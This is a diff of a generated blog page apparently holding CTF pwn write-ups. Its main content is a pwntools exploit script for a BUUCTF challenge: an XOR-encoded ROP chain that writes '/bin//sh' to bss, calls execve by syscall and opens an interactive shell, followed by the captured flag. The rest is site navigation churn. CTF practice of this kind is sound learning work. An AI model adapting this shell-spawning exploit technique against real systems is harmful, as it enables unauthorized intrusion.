-ROP = p64(pop_rsi) + p64(bss) + p64(pop_rax) + <span class="hljs-string">b&#x27;/bin//sh&#x27;</span> + p64(mov_rax_inrsi) <span class="hljs-comment"># input /bin/sh</span>
-ROP += p64(pop_rdi) + p64(bss) + p64(pop_rdx_rsi) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span> + p64(pop_rax) + p64(<span class="hljs-number">0x3B</span>) + p64(syscall)
-p.recvuntil(<span class="hljs-string">&quot;Please enter your Password: \n&quot;</span>)
-payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x50</span> + encode(ROP)
-p.sendline(payload)
-p.interactive()
-<span class="hljs-comment">#flag&#123;0b3cbb3d-891c-4f56-8b75-33f4f7d17bc7&#125;</span>
-</code></pre>
-
+<figure class="highlight python"><figcaption data-lang="python"><span>n</span></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre>p<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">29457</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="4"></td><td><pre>context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token keyword">def</span> <span class="token function">encode</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    res<span class="token operator">=</span><span class="token string">''</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="8"></td><td><pre>        res <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">^</span><span class="token number">0x66</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token keyword">return</span> res</pre></td></tr><tr><td data-num="10"></td><td><pre>pop_rdi <span class="token operator">=</span> <span class="token number">0x4006e6</span></pre></td></tr><tr><td data-num="11"></td><td><pre>pop_rdx_rsi <span class="token operator">=</span> <span class="token number">0x44c179</span></pre></td></tr><tr><td data-num="12"></td><td><pre>pop_rsi <span class="token operator">=</span> <span class="token number">0x4040fe</span></pre></td></tr><tr><td data-num="13"></td><td><pre>bss <span class="token operator">=</span> <span class="token number">0x6BC2E0</span></pre></td></tr><tr><td data-num="14"></td><td><pre>read <span class="token operator">=</span> <span class="token number">0x449BE0</span></pre></td></tr><tr><td data-num="15"></td><td><pre>puts <span class="token operator">=</span> <span class="token number">0x410550</span></pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token builtin">open</span> <span class="token operator">=</span> <span class="token number">0x4102B0</span></pre></td></tr><tr><td data-num="17"></td><td><pre>syscall <span class="token operator">=</span> <span class="token number">0x40139c</span></pre></td></tr><tr><td data-num="18"></td><td><pre>pop_rax <span class="token operator">=</span> <span class="token number">0x449b9c</span></pre></td></tr><tr><td data-num="19"></td><td><pre>mov_rax_inrsi <span class="token operator">=</span> <span class="token number">0x47f7b1</span></pre></td></tr><tr><td data-num="20"></td><td><pre>ROP <span class="token operator">=</span> p64<span class="token punctuation">(</span>pop_rsi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bss<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rax<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'/bin//sh'</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>mov_rax_inrsi<span class="token punctuation">)</span> <span class="token comment"># input /bin/sh</span></pre></td></tr><tr><td data-num="21"></td><td><pre>ROP <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bss<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdx_rsi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rax<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x3B</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>syscall<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="22"></td><td><pre>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Please enter your Password: \n"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="23"></td><td><pre>payload <span class="token operator">=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x50</span> <span class="token operator">+</span> encode<span class="token punctuation">(</span>ROP<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="24"></td><td><pre>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="25"></td><td><pre>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="26"></td><td><pre><span class="token comment">#flag&#123;0b3cbb3d-891c-4f56-8b75-33f4f7d17bc7&#125;</span></pre></td></tr></table></figure>
       <div class="tags">
           <a href="/tags/pwn/" rel="tag"><i class="ic i-tag"></i> pwn</a>
       </div>
@@ -511,7 +310,7 @@ p.interactive()
     <div class="item left">
       
 
-  <a href="/2022/09/29/NTRU/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;tva1.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1giciukx8a7j20zk0m8aio.jpg" title="NTRU">
+  <a href="/2022/09/29/NTRU/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;tva1.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1giclh0m9pdj20zk0m8hdt.jpg" title="NTRU">
   <span class="type">Previous Post</span>
   <span class="category"><i class="ic i-flag"></i> </span>
   <h3>NTRU</h3>
@@ -521,7 +320,7 @@ p.interactive()
     <div class="item right">
       
 
-  <a href="/2022/10/29/2022-hackgame%E5%A4%8D%E7%8E%B0/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;tva1.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1gipexj2jgzj20zk0m8b09.jpg" title="2022-hackgame复现">
+  <a href="/2022/10/29/2022-hackgame%E5%A4%8D%E7%8E%B0/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;tva1.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1giclh5u05ej20zk0m87df.jpg" title="2022-hackgame复现">
   <span class="type">Next Post</span>
   <span class="category"><i class="ic i-flag"></i> </span>
   <h3>2022-hackgame复现</h3>
@@ -543,7 +342,7 @@ p.interactive()
   <div class="panels">
     <div class="inner">
       <div class="contents panel pjax" data-title="Contents">
-          <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#ciscn_2019_n_3"><span class="toc-number">1.</span> <span class="toc-text"> ciscn_2019_n_3</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="toc-number">1.1.</span> <span class="toc-text"> 知识点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90"><span class="toc-number">1.2.</span> <span class="toc-text"> 题目分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#new-note"><span class="toc-number">1.2.1.</span> <span class="toc-text"> New note</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#delete-note%E7%9A%84%E5%85%B7%E4%BD%93%E8%BF%87%E7%A8%8B"><span class="toc-number">1.2.2.</span> <span class="toc-text"> Delete note的具体过程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">1.2.3.</span> <span class="toc-text"> 漏洞利用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E7%AD%94"><span class="toc-number">1.2.4.</span> <span class="toc-text"> 解答</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ciscn_s_9"><span class="toc-number">2.</span> <span class="toc-text"> ciscn_s_9</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9-2"><span class="toc-number">2.1.</span> <span class="toc-text"> 知识点</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ciscn_final_3"><span class="toc-number">3.</span> <span class="toc-text"> ciscn_final_3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ciscn_s_8"><span class="toc-number">4.</span> <span class="toc-text"> ciscn_s_8</span></a></li></ol>
+          <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#ciscn_2019_n_3"><span class="toc-number">1.</span> <span class="toc-text"> ciscn_2019_n_3</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="toc-number">1.1.</span> <span class="toc-text"> 知识点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90"><span class="toc-number">1.2.</span> <span class="toc-text"> 题目分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#new-note"><span class="toc-number">1.2.1.</span> <span class="toc-text"> New note</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#delete-note%E7%9A%84%E5%85%B7%E4%BD%93%E8%BF%87%E7%A8%8B"><span class="toc-number">1.2.2.</span> <span class="toc-text"> Delete note 的具体过程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">1.2.3.</span> <span class="toc-text"> 漏洞利用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E7%AD%94"><span class="toc-number">1.2.4.</span> <span class="toc-text"> 解答</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ciscn_s_9"><span class="toc-number">2.</span> <span class="toc-text"> ciscn_s_9</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9-2"><span class="toc-number">2.1.</span> <span class="toc-text"> 知识点</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ciscn_final_3"><span class="toc-number">3.</span> <span class="toc-text"> ciscn_final_3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ciscn_s_8"><span class="toc-number">4.</span> <span class="toc-text"> ciscn_s_8</span></a></li></ol>
       </div>
       <div class="related panel pjax" data-title="Related">
       </div>
@@ -628,25 +427,7 @@ p.interactive()
 <div class="breadcrumb">
 </div>
 
-    <span><a href="/2022/12/11/reverse%E6%B3%9B%E5%81%9A1/" title="reverse泛做1">reverse泛做1</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-</div>
-
-    <span><a href="/2023/03/26/2023-3-PWHHUB/" title="2023_3_PWHHUB">2023_3_PWHHUB</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-</div>
-
-    <span><a href="/2022/05/17/Misc1/" title="Misc1">Misc1</a></span>
+    <span><a href="/2022/10/29/2022-hackgame%E5%A4%8D%E7%8E%B0/" title="2022-hackgame复现">2022-hackgame复现</a></span>
   </li>
 
       
@@ -664,33 +445,6 @@ p.interactive()
 <div class="breadcrumb">
 </div>
 
-    <span><a href="/2022/09/29/NTRU/" title="NTRU">NTRU</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-</div>
-
-    <span><a href="/2023/04/16/largebin-attach/" title="largebin_attach">largebin_attach</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-</div>
-
-    <span><a href="/2022/09/03/Sage%E7%9A%84%E4%BD%BF%E7%94%A8/" title="Sage的使用">Sage的使用</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-</div>
-
     <span><a href="/2022/09/03/%E6%A0%BC%E5%AF%86%E7%A0%81/" title="格密码">格密码</a></span>
   </li>
 
@@ -700,7 +454,7 @@ p.interactive()
 <div class="breadcrumb">
 </div>
 
-    <span><a href="/2022/10/29/2022-hackgame%E5%A4%8D%E7%8E%B0/" title="2022-hackgame复现">2022-hackgame复现</a></span>
+    <span><a href="/2023/02/21/idek2022%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/" title="idek2022部分复现">idek2022部分复现</a></span>
   </li>
 
       
@@ -709,7 +463,52 @@ p.interactive()
 <div class="breadcrumb">
 </div>
 
-    <span><a href="/2022/08/07/Lucky-7-%E4%BA%8C%E5%85%83%E9%9D%9E%E7%BA%BF%E6%80%A7%E5%90%8C%E4%BD%99%E6%96%B9%E7%A8%8B%E7%BB%84/" title="Lucky 7 二元非线性同余方程组">Lucky 7 二元非线性同余方程组</a></span>
+    <span><a href="/2022/12/11/reverse%E6%B3%9B%E5%81%9A1/" title="reverse泛做1">reverse泛做1</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2022/09/29/Paillier%E5%90%8C%E6%80%81%E5%8A%A0%E5%AF%86/" title="Paillier同态加密">Paillier同态加密</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2022/05/17/Misc1/" title="Misc1">Misc1</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2022/08/27/%E7%BD%91%E9%BC%8E%E6%9D%AFre%E3%80%81Crypto/" title="网鼎杯re、Crypto">网鼎杯re、Crypto</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2022/09/13/Crypto%E5%A4%8D%E7%8E%B01/" title="Crypto复现1">Crypto复现1</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2022/09/03/Sage%E7%9A%84%E4%BD%BF%E7%94%A8/" title="Sage的使用">Sage的使用</a></span>
   </li>
 
   </ul>
